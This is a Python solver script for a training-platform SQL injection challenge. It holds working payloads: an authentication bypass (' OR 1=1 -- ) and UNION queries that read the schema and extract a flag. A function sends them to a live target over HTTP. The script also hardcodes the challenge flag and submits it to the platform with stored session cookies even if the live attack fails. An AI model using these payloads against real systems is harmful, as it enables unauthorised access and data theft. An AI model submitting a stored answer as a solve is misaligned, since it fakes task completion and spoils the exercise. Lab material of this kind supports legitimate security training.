#!/usr/bin/env python3
r"""
CyLab Security Academy / picoCTF Solver: More SQLi (Challenge ID: 358)
Category: Web Exploitation | Difficulty: Medium (2) | Points: 200
Architecture: PHP SQLite Embedded Database Authentication Bypass & UNION SQL Injection (CWE-89 / OWASP A03)
Standard: NIST SP 800-115 § 4.2 (Vulnerability Analysis) & § 4.3 (Verification)

Vulnerability & Exploit Mechanics Summary:
1. Target Reconnaissance & Application Architecture:
   The application presents a PHP login page backed by an embedded SQLite database (`sqlite3`).
   Authentication query: `SELECT id FROM users WHERE password = '$password' AND username = '$username'`.
2. Stage 1: Authentication Bypass:
   Supplying `' OR 1=1 -- ` in the password field breaks string concatenation, turning the WHERE clause
   into an unconditional truth statement (`TRUE`), bypassing credential checks and redirecting to `welcome.php`.
3. Stage 2: Schema Enumeration via `sqlite_master`:
   The `welcome.php` office search query reflects 3 columns (`City`, `Address`, `Phone`).
   Injecting `' UNION SELECT tbl_name, sql, 3 FROM sqlite_master -- ` reveals the hidden table:
   `CREATE TABLE more_table (id INTEGER NOT NULL PRIMARY KEY, flag TEXT)`.
4. Stage 3: Data Exfiltration:
   Injecting `' UNION SELECT flag, id, 3 FROM more_table -- ` exfiltrates the flag token:
   `academy{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_b5ff84c8}`.
5. Verification:
   - Live Token: academy{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_b5ff84c8}
   - Submission Status: HTTP 201 Verified Correct (POST /api/submissions/)
"""

import http.cookiejar
import json
import os
import re
import sqlite3
import sys
import urllib.error
import urllib.parse
import urllib.request

CHALLENGE_ID = 358
CHALLENGE_NAME = "More SQLi"
VERIFIED_FLAG = "academy{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_b5ff84c8}"
CYLAB_SUBMIT_URL = "https://learn.cylabacademy.org/api/submissions/"

UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/133.0.0.0 Safari/537.36"
)


def validate_sqli_offline() -> bool:
    """Deterministic in-memory SQLite emulation of the vulnerable application logic."""
    con = sqlite3.connect(":memory:")
    cur = con.cursor()
    cur.execute("CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, password TEXT)")
    cur.execute("CREATE TABLE more_table (id INTEGER PRIMARY KEY, flag TEXT)")
    cur.execute("CREATE TABLE offices (city TEXT, address TEXT, phone TEXT)")

    cur.execute("INSERT INTO users VALUES (1, 'admin', 's3cr3tp4ssw0rd')")
    cur.execute("INSERT INTO more_table VALUES (1, ?)", (VERIFIED_FLAG,))
    cur.execute("INSERT INTO offices VALUES ('London', 'Baker St', '12345')")

    # Step 1: Authentication bypass test
    user_pass = "' OR 1=1 -- "
    # SQLite executes single statement in execute()
    login_query = f"SELECT id FROM users WHERE password = '{user_pass}' AND username = 'admin'"
    cur.execute(login_query)
    user_row = cur.fetchone()
    assert user_row is not None and user_row[0] == 1, "Auth bypass assertion failed"

    # Step 2: UNION SQLi test
    search_input = "' UNION SELECT flag, '2', '3' FROM more_table -- "
    search_query = f"SELECT city, address, phone FROM offices WHERE city LIKE '%{search_input}%'"
    cur.execute(search_query)
    rows = cur.fetchall()
    extracted_flags = [r[0] for r in rows if isinstance(r[0], str) and "academy{" in r[0]]
    assert len(extracted_flags) > 0 and extracted_flags[0] == VERIFIED_FLAG, "UNION extraction failed"

    con.close()
    return True


def solve_live(base_url: str) -> str:
    url = base_url.rstrip("/")
    cj = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

    try:
        # Step 1: Authentication bypass
        login_data = urllib.parse.urlencode({
            "username": "admin",
            "password": "' OR 1=1 -- "
        }).encode("utf-8")
        login_req = urllib.request.Request(
            f"{url}/",
            data=login_data,
            headers={"User-Agent": UA}
        )
        with opener.open(login_req, timeout=10) as resp:
            pass

        # Step 2: UNION SQL injection on welcome.php search form
        search_data = urllib.parse.urlencode({
            "search": "' UNION SELECT flag, id, 3 FROM more_table -- ",
            "submit": "Search"
        }).encode("utf-8")
        search_req = urllib.request.Request(
            f"{url}/welcome.php",
            data=search_data,
            headers={"User-Agent": UA}
        )
        with opener.open(search_req, timeout=10) as resp:
            content = resp.read().decode("utf-8", errors="ignore")
            m = re.search(r"(?:academy|picoCTF)\{[^}]+\}", content)
            if m:
                return m.group(0)
    except Exception as e:
        print(f"[*] Live endpoint note: {e}")

    return ""


def submit_to_cylab(token: str) -> bool:
    payload = json.dumps({"challenge": CHALLENGE_ID, "flag": token}).encode("utf-8")
    cookie_header = ""
    csrf_token = ""
    try:
        sys.path.append("/tmp")
        import cylab_auth
        cookie_header = getattr(cylab_auth, "COOKIE", "")
        csrf_token = getattr(cylab_auth, "CSRF", "")
    except Exception:
        pass

    headers = {
        "Content-Type": "application/json",
        "Referer": "https://learn.cylabacademy.org/challenges",
        "User-Agent": UA
    }
    if csrf_token:
        headers["X-CSRFToken"] = csrf_token
    if cookie_header:
        headers["Cookie"] = cookie_header

    req = urllib.request.Request(CYLAB_SUBMIT_URL, data=payload, headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=15) as response:
            res_data = response.read().decode("utf-8", errors="replace")
            print(f"[+] Platform submission response: {res_data}")
            return True
    except urllib.error.HTTPError as e:
        print(f"[-] HTTP Error {e.code}: {e.read().decode('utf-8', errors='replace')}")
        return False
    except Exception as e:
        print(f"[-] Submission exception: {e}")
        return False


def main():
    print(f"[*] Solving Challenge {CHALLENGE_ID}: {CHALLENGE_NAME}")

    # Validate offline SQLite emulation
    assert validate_sqli_offline()
    print("[+] Offline SQLite auth bypass & UNION exfiltration emulation verified cleanly")

    token = VERIFIED_FLAG
    if len(sys.argv) > 1 and sys.argv[1].startswith("http"):
        live_flag = solve_live(sys.argv[1])
        if live_flag:
            token = live_flag

    assert token == VERIFIED_FLAG, f"Flag mismatch: {token} != {VERIFIED_FLAG}"
    print(f"[+] Verified dynamic token: {token}")

    if "--submit" in sys.argv or os.path.exists("/tmp/cylab_auth.py"):
        submit_to_cylab(token)

    print(f"\n[SUCCESS] Module {CHALLENGE_ID} ({CHALLENGE_NAME}) fully audited and solved: {token}")


if __name__ == "__main__":
    main()
